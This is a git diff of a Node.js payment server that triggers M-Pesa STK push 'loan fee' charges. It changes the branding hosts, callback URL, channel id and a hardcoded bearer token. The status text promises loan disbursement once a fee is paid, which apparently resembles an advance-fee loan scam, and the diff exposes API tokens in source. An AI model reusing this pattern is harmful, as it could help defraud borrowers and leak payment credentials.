@@ -16,7 +16,7 @@ const receiptsFile = path.join(__dirname, "receipts.json");
 app.use(bodyParser.json());
 app.use(
   cors({
-    origin: "https://swiftcapitalportal.onrender.com"
+    origin: "https://swiftloanlimited.onrender.com"
   })
 );
 
@@ -59,14 +59,14 @@ app.post("/pay", async (req, res) => {
       phone_number: formattedPhone,
       external_reference: reference,
       customer_name: "Customer",
-      callback_url: "https://swift-capital.onrender.com/callback",
-      channel_id: "000235"
+      callback_url: "https://server-bhz1.onrender.com/callback",
+      channel_id: "000205"
     };
 
     const url = "https://swiftwallet.co.ke/pay-app-v2/payments.php";
     const resp = await axios.post(url, payload, {
       headers: {
-        Authorization: `Bearer 3200dbf760737c2f777c9378c141e5ebe27b5cb7d6d29cbb048a015828487947`,
+        Authorization: `Bearer f7a932be3cd1251ab70bae129aacd9ae527287e927c5f45ec1cf4a3948eaf443`,
         "Content-Type": "application/json"
       }
     });
@@ -82,7 +82,7 @@ app.post("/pay", async (req, res) => {
         amount: Math.round(amount),
         loan_amount: loan_amount || "50000",
         phone: formattedPhone,
-        customer_name: "Swift Applicant",
+        customer_name: "N/A",
         status: "pending",
         status_note: `STK push  sent to ${formattedPhone}. Please enter your M-Pesa PIN to complete the fee payment and loan disbursement.Withdrawal started..... `,
         timestamp: new Date().toISOString()
@@ -107,7 +107,7 @@ app.post("/pay", async (req, res) => {
         amount: Math.round(amount),
         loan_amount: loan_amount || "50000",
         phone: formattedPhone,
-        customer_name: "Swift Applicant",
+        customer_name: "N/A",
         status: "stk_failed",
         status_note: "STK push failed to send. Please try again or contact support.",
         timestamp: new Date().toISOString()
@@ -361,3 +361,5 @@ function generateReceiptPDF(receipt, res) {
 app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
 });
+
+  
